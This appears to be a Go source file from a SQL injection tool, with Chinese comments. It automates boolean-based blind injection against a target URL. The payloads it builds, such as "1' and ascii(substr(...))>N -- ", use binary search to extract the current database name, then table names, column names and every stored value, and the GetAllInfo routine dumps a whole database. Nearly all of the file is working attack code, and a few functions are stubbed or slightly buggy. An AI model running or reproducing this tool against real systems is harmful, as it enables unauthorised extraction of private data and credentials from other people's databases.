package bool_blind2

import (
	"fmt"
	"github.com/c0rdXy/GoSM/myUtils"
	"github.com/c0rdXy/GoSM/myUtils/myhttp"
	"github.com/c0rdXy/GoSM/myUtils/output"
	"log"
)

// getCurrentDatabaseBinary 执行二分搜索以提取当前数据库名
func getCurrentDatabaseBinary(baseUrl string) []string {

	dbName := ""
	dbNames := make([]string, 0)
	sqlPayload := "database()"

	j := 1
	exitFlag := false
	for !exitFlag {
		exitFlag = true
		low := 32
		high := 126
		for high >= low {
			mid := (low + high) / 2

			// 测试当前位置
			payload := fmt.Sprintf("1' and ascii(substr(%s,%d,%d))=%d -- ", sqlPayload, j, j, mid)
			_, check, err := myhttp.GetRequest(baseUrl, payload, myUtils.B)
			if err != nil {
				log.Fatalln("无法发起请求: ", err)
			}

			if check {
				dbName += string(mid)
				//fmt.Println("数据库名: ", dbName)
				exitFlag = false
				break
			}

			// 另一个测试，用于缩小左侧或右侧的搜索范围
			payload = fmt.Sprintf("1' and ascii(substr(%s,%d,%d))>%d -- ", sqlPayload, j, j, mid)
			_, check, err = myhttp.GetRequest(baseUrl, payload, myUtils.B)
			if err != nil {
				log.Fatalln("无法发起请求: ", err)
			}
			if check {
				low = mid + 1
			} else {
				high = mid - 1
			}
		}
		j += 1
	}
	dbNames = append(dbNames, dbName)

	return dbNames
}

// getDatabasesBinary 执行布尔盲注以获取所有数据库名并返回数据库名数组
func getDatabasesBinary(baseURL string) []string {
	// 这里你可以根据具体情况实现获取所有数据库名的逻辑
	// 示例中返回一个空数组，请根据实际情况修改
	return []string{}
}

// probeTablesBinary 执行二分搜索以获取指定数据库的所有表名并返回所有表名的数组
func getTablesBinary(baseURL, databaseName string) []string {

	tables := make([]string, 0)

	j := 0
	for {
		exitFlag := true
		low := 32
		high := 126
		for high >= low {
			mid := (low + high) / 2

			payload := fmt.Sprintf("1' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit 1 offset %d),1,1))=%d -- ", databaseName, j, mid)
			_, check, err := myhttp.GetRequest(baseURL, payload, myUtils.B)
			if err != nil {
				log.Fatalln("无法发起请求: ", err)
			}

			if check {
				tableName := ""
				for k := 1; ; k++ {
					exitFlag2 := true
					for l := 32; l < 126; l++ {
						payload := fmt.Sprintf("1' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit 1 offset %d),%d,1))=%d -- ", databaseName, j, k, l)
						_, check, err := myhttp.GetRequest(baseURL, payload, myUtils.B)
						if err != nil {
							log.Fatalln("无法发起请求: ", err)
						}

						if check {
							tableName += string(l)
							exitFlag2 = false
							break
						}
					}

					if exitFlag2 {
						break
					}
				}

				tables = append(tables, tableName)
				//fmt.Println("表名: ", tableName)
				exitFlag = false
				break
			}

			payload = fmt.Sprintf("1' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit 1 offset %d),1,1))>%d -- ", databaseName, j, mid)
			_, check, err = myhttp.GetRequest(baseURL, payload, myUtils.B)
			if err != nil {
				log.Fatalln("无法发起请求: ", err)
			}
			if check {
				low = mid + 1
			} else {
				high = mid - 1
			}
		}

		if exitFlag {
			break
		}

		j++
	}

	return tables
}

// getColumnsBinary 执行二分搜索以获取指定表的所有字段名并返回所有字段名的数组
func getColumnsBinary(baseURL, databaseName, tableName string) []string {

	columns := make([]string, 0)

	j := 0
	for {
		exitFlag := true
		low := 32
		high := 126
		for high >= low {
			mid := (low + high) / 2

			payload := fmt.Sprintf("1' and ascii(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit 1 offset %d),1,1))=%d -- ", databaseName, tableName, j, mid)
			_, check, err := myhttp.GetRequest(baseURL, payload, myUtils.B)
			if err != nil {
				log.Fatalln("无法发起请求: ", err)
			}

			if check {
				columnName := ""
				for k := 1; ; k++ {
					exitFlag2 := true
					for l := 32; l < 126; l++ {
						payload := fmt.Sprintf("1' and ascii(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit 1 offset %d),%d,1))=%d -- ", databaseName, tableName, j, k, l)
						_, check, err := myhttp.GetRequest(baseURL, payload, myUtils.B)
						if err != nil {
							log.Fatalln("无法发起请求: ", err)
						}

						if check {
							columnName += string(l)
							exitFlag2 = false
							break
						}
					}

					if exitFlag2 {
						break
					}
				}

				columns = append(columns, columnName)
				//fmt.Println("字段名: ", columnName)
				exitFlag = false
				break
			}

			payload = fmt.Sprintf("1' and ascii(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit 1 offset %d),1,1))>%d -- ", databaseName, tableName, j, mid)
			_, check, err = myhttp.GetRequest(baseURL, payload, myUtils.B)
			if err != nil {
				log.Fatalln("无法发起请求: ", err)
			}
			if check {
				low = mid + 1
			} else {
				high = mid - 1
			}
		}

		if exitFlag {
			break
		}

		j++
	}

	return columns
}

// getColumnValuesBinary 执行二分搜索以获取指定字段的所有值并返回所有值的数组
func getColumnValuesBinary(baseURL, databaseName, tableName, columnName string) []string {

	values := make([]string, 0)

	j := 0
	for {
		exitFlag := true
		low := 32
		high := 126
		for high >= low {
			mid := (low + high) / 2

			payload := fmt.Sprintf("1' and ascii(substr((select %s from %s.%s limit 1 offset %d),1,1))=%d -- ", columnName, databaseName, tableName, j, mid)
			_, check, err := myhttp.GetRequest(baseURL, payload, myUtils.B)
			if err != nil {
				log.Fatalln("无法发起请求: ", err)
			}

			if check {
				value := ""
				for k := 1; ; k++ {
					exitFlag2 := true
					for l := 32; l < 126; l++ {
						payload := fmt.Sprintf("1' and ascii(substr((select %s from %s.%s limit 1 offset %d),%d,1))=%d -- ", columnName, databaseName, tableName, j, k, l)
						_, check, err := myhttp.GetRequest(baseURL, payload, myUtils.B)
						if err != nil {
							log.Fatalln("无法发起请求: ", err)
						}

						if check {
							value += string(l)
							exitFlag2 = false
							break
						}
					}

					if exitFlag2 {
						break
					}
				}

				values = append(values, value)
				//fmt.Printf("值: %s\n", value)
				exitFlag = false
				break
			}

			payload = fmt.Sprintf("1' and ascii(substr((select %s from %s.%s limit 1 offset %d),1,1))>%d -- ", columnName, databaseName, tableName, j, mid)
			_, check, err = myhttp.GetRequest(baseURL, payload, myUtils.B)
			if err != nil {
				log.Fatalln("无法发起请求: ", err)
			}
			if check {
				low = mid + 1
			} else {
				high = mid - 1
			}
		}

		if exitFlag {
			break
		}

		j++
	}

	return values
}

// GetCurrentDatabase 打印当前数据库名
func GetCurrentDatabase(baseURL string) []string {
	currentDatabase := getCurrentDatabaseBinary(baseURL)
	output.PrintCurrentDatabases(currentDatabase)
	return currentDatabase
}

// GetAllDatabases 打印所有数据库名
func GetAllDatabases(baseURL string) []string {
	databases := getDatabasesBinary(baseURL)
	output.PrintDatabaseArray(databases)
	return databases
}

// GetTablesInDatabase 打印某个数据库的所有表
func GetTablesInDatabase(baseURL, database string) []string {
	tables := getTablesBinary(baseURL, database)
	output.PrintTables(tables)
	return tables
}

// GetColumnsInTable 打印某个表的所有字段名
func GetColumnsInTable(baseURL, database, tableName string) []string {

	// 获取字段名
	columns := getColumnsBinary(baseURL, database, tableName)
	output.PrintColumns(columns)

	return columns
}

// GetColumnsInTable 打印某个表的某个字段的全部内容
func GetColumnsAndValues(baseURL, database, tableName, column string) []string {
	columns := make([]string, 0)
	values := make([]string, 0)

	// 获取字段名
	columns = append(columns, column)

	// 获取每个字段的值
	for _, column := range columns {
		values := getColumnValuesBinary(baseURL, database, tableName, column)
		values = append(values, values...)
		output.PrintColumnValuesArray(column, values)
	}

	return values
}

// GetColumnsInTable 打印某个表的所有字段和内容
func GetColumnsAndValuesInTable(baseURL, database, tableName string) map[string][]string {
	result := make(map[string][]string)

	// 获取字段名
	columns := getColumnsBinary(baseURL, database, tableName)
	output.PrintColumns(columns)
	result["columns"] = columns

	// 获取每个字段的值
	for _, column := range columns {
		values := getColumnValuesBinary(baseURL, database, tableName, column)
		output.PrintColumnValuesArray(column, values)
		result[column] = values
	}

	return result
}

// 打印某些表的所有字段和内容
func GetColumnsAndValuesInTables(baseUrl string, database string, tables []string) {
	for _, table := range tables {
		output.PrintTable(table)
		GetColumnsAndValuesInTable(baseUrl, database, table)
	}
}

func GetAllInfo(baseUrl string) {
	currentDatabase := GetCurrentDatabase(baseUrl)
	tablesInDatabase := GetTablesInDatabase(baseUrl, currentDatabase[0])
	GetColumnsAndValuesInTables(baseUrl, currentDatabase[0], tablesInDatabase)
}

//func main() {
//
//	GetAllInfo(baseURL1)
//
//	//GetColumnsInTable(baseURL1, "security", "users")
//
//}
